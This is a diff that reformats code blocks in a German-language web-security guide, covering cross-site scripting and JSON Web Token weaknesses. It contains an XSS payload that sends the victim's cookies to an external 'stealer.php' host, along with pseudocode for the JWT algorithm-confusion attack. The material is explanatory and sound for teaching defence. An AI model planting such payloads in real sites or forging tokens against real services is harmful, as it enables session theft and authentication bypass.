@@ -307,8 +307,8 @@ einen externen Server (xyz.com) durchführt und als GET-Parameter die
 aktuellen Cookies übergibt:
 
 ```html
-    <script>location.href = 'http://xyz.com/stealer.php?cookie='+document.cookie;
-    </script>
+<script>location.href = 'http://xyz.com/stealer.php?cookie='+document.cookie;
+</script>
 ```
 
 Folgende Gegenmaßnahmen sollten implementiert werden:
@@ -343,17 +343,17 @@ HTTP Parameter, HTTP Session Cookies oder mittels eines HTTP Headers
 
 Die Gesamtstruktur des Tokens ist:
 
-```
-    verification = algorithm(base64(header) + "." + base64(content))
-    token = base64(header) + "." + base64(content) + "." + base64(hash)
+```text
+verification = algorithm(base64(header) + "." + base64(content))
+token = base64(header) + "." + base64(content) + "." + base64(hash)
 ```
 
 Ein Beispiel für einen Token (man kann dabei die drei durch einen .
 getrennten Base64-Bereiche erkennen. Da es sich um encoded JSON handelt,
 beginnen die beiden ersten Base64-Blöcke immer mit *eyJ*):
 
-```
-    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+```text
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 ```
 
 ### Problem: Null-Algorithmus
@@ -391,7 +391,9 @@ Verfahren zur Erstellung eines MACs verwendet wird.
 
 Die Methode zur Verifikation eines Tokens wird folgend aufgerufen:
 
-        validate(token, key)
+```text
+validate(token, key)
+```
 
 Als erster Parameter wird das zu verifizierende Token übergeben, als
 zweiter Parameter wird der zu verwendende Key übergeben. Bei einem
@@ -408,8 +410,10 @@ ausgeht, dass der Client immer ein Signatur-basiertes Verfahren
 verwenden wird. In dem Fall würde eine naive Implementierung folgenden
 Code wählen:
 
-        # assume that token is an signature-based token
-        validate(token, public-key)
+```text
+# assume that token is an signature-based token
+validate(token, public-key)
+```
 
 Es wird also der public key verwendet um die Signatur zu überprüfen.
 
@@ -420,11 +424,13 @@ verwendet er den public key der für die Überprüfung der Signatur
 verwendet wird. Wenn er nun dieses Token an den Service übergibt wird
 folgendes Code-Fragment aufgerufen:
 
-        # token ist ein MAC-basiertes token
-        # die validate Funktion wird deswegen versuchen
-        # einen MAC zu berechnen und verwendet dafür
-        # den zweiten Parameter (public-key)
-        validate(token, public-key)
+```text
+# token ist ein MAC-basiertes token
+# die validate Funktion wird deswegen versuchen
+# einen MAC zu berechnen und verwendet dafür
+# den zweiten Parameter (public-key)
+validate(token, public-key)
+```
 
 Da der Server (hardcoded) annimmt, dass eine Signatur überprüft wird,
 wird der public key (den der Angreifer zum Erstellen des MACs verwendet
